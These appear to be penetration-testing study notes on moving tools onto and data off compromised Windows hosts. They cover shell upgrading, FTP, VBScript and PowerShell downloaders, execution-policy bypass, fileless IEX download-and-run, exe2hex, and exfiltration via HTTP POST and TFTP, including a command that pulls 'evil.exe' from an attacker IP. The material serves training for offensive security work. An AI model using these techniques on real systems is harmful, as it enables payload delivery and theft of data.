# Considerations
- Consider the implication of transferring attack tools and utilites onto the target.  Try as a preference to #LOLBAS.
- Non-interactive shells : most netcat-like tools provide a non-interactive shell.  This hinders commands that require user interaction... This require upgrading the shell. 
1. using the #pty module in python. 
	1. **python -c 'import pty; pty.spawn("/bin/bash")'** 
	2. (inside the nc session) **CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;** 

# Transferring files with Windows hosts
- As windows clients ship with a default #FTP client, we'll start with that. The **ftp -s** option accepts a text-based command list that effectively makes the client non-interactive.
	1. On the attack machine, put the nc.exe bin in the directory from which you'll launch your attack and **systemctl restart pure-ftpd** 
	2. Build a .txt file of FTP commands to execute using the **echo** command. ![[Pasted image 20221027104103.png]]
	3. Use the **ftp -v -n -s:ftp.txt** command then verify it worked !![[Pasted image 20221027104331.png]]

# Windows downloads using scripting languages
- Can use a #VBScript for older versions (WindowsXP, 2003) and PowerShell.  An example of a simple HTTP downloader using non-interactive echo commands is ![[Pasted image 20221027105655.png]]
	- You can then run this script using **cscript** with the following command : **cscript wget.vbs http://10.11.0.4/evil:exe evil.exe**
- We can do the same with #PowerShell as in the following example : ![[Pasted image 20221027110357.png]]
	- Then running the script with PowerShell using the following command : **powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1** 
- We can also download and execute a .ps1 w/o saving it to a disk using the *System.Net.Webclient* class by combining the **DownloadString*** method wiht the *Invoke-Expression* cmdlet (**IEX**) ![[Pasted image 20221027113219.png]]

## Windows downloads with #exe2hex and .ps
This is a more roundabout method, but interesting nonetheless.
1. On kali, compress teh binary to transfer (**upx -9 nc.exe**)
2. Convert the *.exe* file to a windows script (*.cmd*).  This will convert the file to hex and instruct **powershell.exe** to assemble it back to binary. **exe2hex -x nc.exe -p nc.cmd** 
3. embed it into a Windows script.

### Windows uploads using Windows scripting languages
Exfiltrating data using a Windows client presents a challenge since TFTP, FTP, and HTTP servers are rarely enabled on Windows by default.  That said, if HTTP traffic outbound is allowed, can use *System.Net.WebClient* ps1 class to upload data ***to*** our Kali machine through an HTTP POST request.
1. On the Kali machine : 
	1. Create a PHP script (*upload.php*) and save it in our kali webroot directory (**/var/www/html**)  ![[Pasted image 20221027115405.png]]
	2. Create the **/var/www/upoads** directory and mod it's permissions to give *www-data* user ownership and write perms.
2. On the Windows machine : 
	1. Invoke the **UploadFile** method from the *System.Net.WebClient* class to upload the doc to exfil. ![[Pasted image 20221027115713.png]]

# Uploading files with TFTP
This may be an effective method for older systems such as XP or Server 2003.  TFTP is a UDP-based protocol, often blocked by outbound firewall rules.  Allows us non-interactive file transfer.
1. Set up TFTP server on Kali![[Pasted image 20221027120433.png]]
2. On Windows, run the TFTP client using hte **-i** to specify a binary image transfer adn **put** to initiate an upload ![[Pasted image 20221027120547.png]]
